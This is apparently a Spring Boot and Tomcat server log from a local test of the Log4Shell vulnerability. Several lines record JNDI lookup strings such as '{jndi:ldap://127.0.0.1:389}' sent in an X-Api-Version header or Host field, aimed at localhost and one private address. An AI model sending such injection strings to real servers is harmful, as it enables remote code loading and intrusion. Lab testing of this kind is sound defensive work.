2021-12-20 08:48:11.466  INFO mips.local --- [           main] c.e.s.Application                        : Starting Application using Java 16.0.1 on mips.local with PID 66668 (/Users/span/Code/github/gs-spring-boot/complete/target/classes started by span in /Users/span/Code/github/gs-spring-boot/complete)
2021-12-20 08:48:11.472  INFO mips.local --- [           main] c.e.s.Application                        : No active profile set, falling back to default profiles: default
2021-12-20 08:48:12.034  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-20 08:48:12.048  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Initializing ProtocolHandler ["http-nio-8080"]
2021-12-20 08:48:12.049  INFO mips.local --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-20 08:48:12.049  INFO mips.local --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.46]
2021-12-20 08:48:12.103  INFO mips.local --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-20 08:48:12.104  INFO mips.local --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 601 ms
2021-12-20 08:48:12.313  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Starting ProtocolHandler ["http-nio-8080"]
2021-12-20 08:48:12.334  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-20 08:48:12.342  INFO mips.local --- [           main] c.e.s.Application                        : Started Application in 1.092 seconds (JVM running for 1.776)
2021-12-20 08:48:12.343  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state LivenessState changed to CORRECT
2021-12-20 08:48:12.344  INFO mips.local --- [           main] c.e.s.Application                        : a Maven Spring boot app(?)
2021-12-20 08:48:12.345  WARN mips.local --- [           main] c.e.s.Application                        : listens on port 8080
2021-12-20 08:48:12.345  INFO mips.local --- [           main] c.e.s.Application                        : pass X-Api-Version
2021-12-20 08:48:12.346  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed to ACCEPTING_TRAFFIC
2021-12-20 08:49:29.010  INFO mips.local --- [nio-8080-exec-2] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-20 08:49:29.011  INFO mips.local --- [nio-8080-exec-2] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-20 08:49:29.012  INFO mips.local --- [nio-8080-exec-2] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
2021-12-20 08:49:29.032  INFO mips.local --- [nio-8080-exec-2] Log4Shell_logshock                       : Received a request for API version {jndi:ldap://127.0.0.1:380}
2021-12-20 08:50:07.193  INFO mips.local --- [nio-8080-exec-3] Log4Shell_logshock                       : Received a request for API version {jndi:ldap://127.0.0.1:380}
2021-12-20 08:50:46.278  INFO mips.local --- [nio-8080-exec-5] Log4Shell_logshock                       : Received a request for API version {jndi:ldap://127.0.0.1:389}
2021-12-20 08:48:27.305  INFO mips.local --- [nio-8080-exec-1] o.a.c.h.Http11Processor                  : The host [${jndi:ldap://192.168.1.118:389}] is not valid
 Note: further occurrences of request parsing errors will be logged at DEBUG level.
java.lang.IllegalArgumentException
	at org.apache.tomcat.util.http.parser.Host.parse(Host.java:78)
	at org.apache.tomcat.util.http.parser.Host.parse(Host.java:45)
	at org.apache.coyote.AbstractProcessor.parseHost(AbstractProcessor.java:298)
	at org.apache.coyote.http11.Http11Processor.prepareRequest(Http11Processor.java:798)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:350)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:831)
2021-12-20 08:52:20.336  WARN mips.local --- [nio-8080-exec-8] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]
2021-12-20 08:58:14.930  INFO mips.local --- [nio-8080-exec-4] Log4Shell_logshock                       : Received a request for API version 3.1{jndi:ldap://127.0.0.1:389}
2021-12-20 09:06:05.491  INFO mips.local --- [extShutdownHook] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed from ACCEPTING_TRAFFIC to REFUSING_TRAFFIC
2021-12-20 09:06:35.415  INFO mips.local --- [           main] c.e.s.Application                        : Starting Application using Java 16.0.1 on mips.local with PID 86658 (/Users/span/Code/github/gs-spring-boot/complete/target/classes started by span in /Users/span/Code/github/gs-spring-boot/complete)
2021-12-20 09:06:35.422  INFO mips.local --- [           main] c.e.s.Application                        : No active profile set, falling back to default profiles: default
2021-12-20 09:06:35.977  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-20 09:06:35.991  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Initializing ProtocolHandler ["http-nio-8080"]
2021-12-20 09:06:35.992  INFO mips.local --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-20 09:06:35.993  INFO mips.local --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.46]
2021-12-20 09:06:36.049  INFO mips.local --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-20 09:06:36.049  INFO mips.local --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 596 ms
2021-12-20 09:06:36.269  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Starting ProtocolHandler ["http-nio-8080"]
2021-12-20 09:06:36.287  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-20 09:06:36.294  INFO mips.local --- [           main] c.e.s.Application                        : Started Application in 1.106 seconds (JVM running for 1.605)
2021-12-20 09:06:36.295  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state LivenessState changed to CORRECT
2021-12-20 09:06:36.296  INFO mips.local --- [           main] c.e.s.Application                        : a Maven Spring boot app(?)
2021-12-20 09:06:36.296  WARN mips.local --- [           main] c.e.s.Application                        : listens on port 8080
2021-12-20 09:06:36.297  INFO mips.local --- [           main] c.e.s.Application                        : pass X-Api-Version
2021-12-20 09:06:36.297  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed to ACCEPTING_TRAFFIC
2021-12-20 09:08:51.453  INFO mips.local --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-20 09:08:51.453  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-20 09:08:51.454  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 0 ms
2021-12-20 09:08:51.472  INFO mips.local --- [nio-8080-exec-1] Log4Shell_logshock                       : Received a request for API version 3.1{jndi:ldap://127.0.0.1:389}
2021-12-20 09:17:27.325  INFO mips.local --- [extShutdownHook] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed from ACCEPTING_TRAFFIC to REFUSING_TRAFFIC
2021-12-20 10:37:41.601  INFO mips.local --- [           main] c.e.s.Application                        : Starting Application using Java 16.0.1 on mips.local with PID 65493 (/Users/span/Code/github/gs-spring-boot/complete/target/classes started by span in /Users/span/Code/github/gs-spring-boot/complete)
2021-12-20 10:37:41.606  INFO mips.local --- [           main] c.e.s.Application                        : No active profile set, falling back to default profiles: default
2021-12-20 10:37:42.212  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-20 10:37:42.226  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Initializing ProtocolHandler ["http-nio-8080"]
2021-12-20 10:37:42.227  INFO mips.local --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-20 10:37:42.228  INFO mips.local --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.46]
2021-12-20 10:37:42.290  INFO mips.local --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-20 10:37:42.290  INFO mips.local --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 650 ms
2021-12-20 10:37:42.510  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Starting ProtocolHandler ["http-nio-8080"]
2021-12-20 10:37:42.529  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-20 10:37:42.538  INFO mips.local --- [           main] c.e.s.Application                        : Started Application in 1.169 seconds (JVM running for 1.703)
2021-12-20 10:37:42.540  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state LivenessState changed to CORRECT
2021-12-20 10:37:42.541  INFO mips.local --- [           main] c.e.s.Application                        : a Maven Spring boot app(?)
2021-12-20 10:37:42.542  WARN mips.local --- [           main] c.e.s.Application                        : listens on port 8080
2021-12-20 10:37:42.542  INFO mips.local --- [           main] c.e.s.Application                        : pass X-Api-Version
2021-12-20 10:37:42.543  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed to ACCEPTING_TRAFFIC
2021-12-20 10:41:00.019  INFO mips.local --- [extShutdownHook] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed from ACCEPTING_TRAFFIC to REFUSING_TRAFFIC
2021-12-20 10:47:59.993  INFO mips.local --- [           main] c.e.s.Application                        : Starting Application using Java 16.0.1 on mips.local with PID 75807 (/Users/span/Code/github/gs-spring-boot/complete/target/classes started by span in /Users/span/Code/github/gs-spring-boot/complete)
2021-12-20 10:47:59.999  INFO mips.local --- [           main] c.e.s.Application                        : No active profile set, falling back to default profiles: default
2021-12-20 10:48:00.556  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-20 10:48:00.572  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Initializing ProtocolHandler ["http-nio-8080"]
2021-12-20 10:48:00.573  INFO mips.local --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-20 10:48:00.574  INFO mips.local --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.46]
2021-12-20 10:48:00.635  INFO mips.local --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-20 10:48:00.635  INFO mips.local --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 602 ms
2021-12-20 10:48:00.845  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Starting ProtocolHandler ["http-nio-8080"]
2021-12-20 10:48:00.862  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-20 10:48:00.870  INFO mips.local --- [           main] c.e.s.Application                        : Started Application in 1.098 seconds (JVM running for 1.768)
2021-12-20 10:48:00.871  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state LivenessState changed to CORRECT
2021-12-20 10:48:00.872  INFO mips.local --- [           main] c.e.s.Application                        : a Maven Spring boot app(?)
2021-12-20 10:48:00.872  WARN mips.local --- [           main] c.e.s.Application                        : listens on port 8080
2021-12-20 10:48:00.872  INFO mips.local --- [           main] c.e.s.Application                        : pass X-Api-Version
2021-12-20 10:48:00.873  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed to ACCEPTING_TRAFFIC
2021-12-20 10:49:22.541  INFO mips.local --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-20 10:49:22.542  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-20 10:49:22.543  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
2021-12-20 10:49:22.559  INFO mips.local --- [nio-8080-exec-1] Log4Shell_logshock                       : Received a request for API version 3.1{jndi:ldap://127.0.0.1:389}
2021-12-20 10:49:53.193  INFO mips.local --- [nio-8080-exec-2] Log4Shell_logshock                       : Received a request for API version {jndi:ldap://127.0.0.1:389}
2021-12-20 10:50:18.676  INFO mips.local --- [nio-8080-exec-3] o.a.c.h.Http11Processor                  : The host [${jndi:ldap://127.0.0.1:389] is not valid
 Note: further occurrences of request parsing errors will be logged at DEBUG level.
java.lang.IllegalArgumentException
	at org.apache.tomcat.util.http.parser.Host.parse(Host.java:78)
	at org.apache.tomcat.util.http.parser.Host.parse(Host.java:45)
	at org.apache.coyote.AbstractProcessor.parseHost(AbstractProcessor.java:298)
	at org.apache.coyote.http11.Http11Processor.prepareRequest(Http11Processor.java:798)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:350)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:831)
2021-12-20 10:51:24.423  INFO mips.local --- [extShutdownHook] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed from ACCEPTING_TRAFFIC to REFUSING_TRAFFIC
2021-12-20 10:54:27.578  INFO mips.local --- [           main] c.e.s.Application                        : Starting Application using Java 16.0.1 on mips.local with PID 82874 (/Users/span/Code/github/gs-spring-boot/complete/target/classes started by span in /Users/span/Code/github/gs-spring-boot/complete)
2021-12-20 10:54:27.585  INFO mips.local --- [           main] c.e.s.Application                        : No active profile set, falling back to default profiles: default
2021-12-20 10:54:28.342  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-20 10:54:28.361  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Initializing ProtocolHandler ["http-nio-8080"]
2021-12-20 10:54:28.363  INFO mips.local --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-20 10:54:28.364  INFO mips.local --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.46]
2021-12-20 10:54:28.432  INFO mips.local --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-20 10:54:28.433  INFO mips.local --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 808 ms
2021-12-20 10:54:28.672  INFO mips.local --- [           main] o.a.c.h.Http11NioProtocol                : Starting ProtocolHandler ["http-nio-8080"]
2021-12-20 10:54:28.696  INFO mips.local --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-20 10:54:28.705  INFO mips.local --- [           main] c.e.s.Application                        : Started Application in 1.385 seconds (JVM running for 2.105)
2021-12-20 10:54:28.706  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state LivenessState changed to CORRECT
2021-12-20 10:54:28.707  INFO mips.local --- [           main] c.e.s.Application                        : a Maven Spring boot app(?)
2021-12-20 10:54:28.707  WARN mips.local --- [           main] c.e.s.Application                        : listens on port 8080
2021-12-20 10:54:28.707  INFO mips.local --- [           main] c.e.s.Application                        : pass X-Api-Version
2021-12-20 10:54:28.709  INFO mips.local --- [           main] o.s.b.a.ApplicationAvailabilityBean      : Application availability state ReadinessState changed to ACCEPTING_TRAFFIC
2021-12-20 10:54:33.334  INFO mips.local --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-20 10:54:33.334  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-20 10:54:33.335  INFO mips.local --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 0 ms
2021-12-20 10:54:33.361  WARN mips.local --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]
2021-12-20 10:54:42.148  INFO mips.local --- [nio-8080-exec-2] Log4Shell_logshock                       : Received a request for API version {jndi:ldap://127.0.0.1:389}
